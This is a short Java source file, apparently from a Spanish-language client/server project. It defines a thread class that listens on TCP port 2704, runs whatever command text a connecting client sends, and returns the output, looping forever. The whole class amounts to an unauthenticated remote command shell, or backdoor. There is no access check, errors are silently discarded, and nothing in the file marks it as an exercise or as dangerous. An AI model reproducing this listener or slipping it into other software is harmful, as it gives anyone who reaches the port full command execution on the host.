/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package hilos;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

/**
 *
 * @author root
 */
public class Comando extends Thread{
    
    public Comando(){
        
    }
    public void run(){
        ServerSocket sServer;

        String comando,comandoSalida="";


        try {
            sServer = new ServerSocket(2704);

            Socket sConexion = sServer.accept();
            System.out.println("Conexion establecida correctamente consola");

            DataInputStream fEntrada; //lo que entra
            DataOutputStream fSalida; // lo que sale      


            ProcessBuilder b = null;

            do {

                // lo que recibe del cliente
                fEntrada = new DataInputStream(sConexion.getInputStream());

                comando = fEntrada.readUTF();


                String identificador = null;

                identificador="0";
                comando=comando.replace("-.-0","");
                b=new ProcessBuilder().command(comando.split(" "));


                Process p = b.start();

                BufferedReader comandoProcesado= new BufferedReader(new InputStreamReader(p.getInputStream()));

                //lo que le envia al cliente
                fSalida = new DataOutputStream(sConexion.getOutputStream());


                
                System.out.println("Resultado del comando "+comando+" fue enviado");
                

                String salida;
                comandoSalida="";

                while((salida = comandoProcesado.readLine()) != null) {
                    comandoSalida+=salida+"\n";
                }


                    fSalida.writeUTF(comandoSalida);

            } while (true/*!mensajeIn.equals("exit")*/);

        } catch (Exception e) {

        }
    }
}
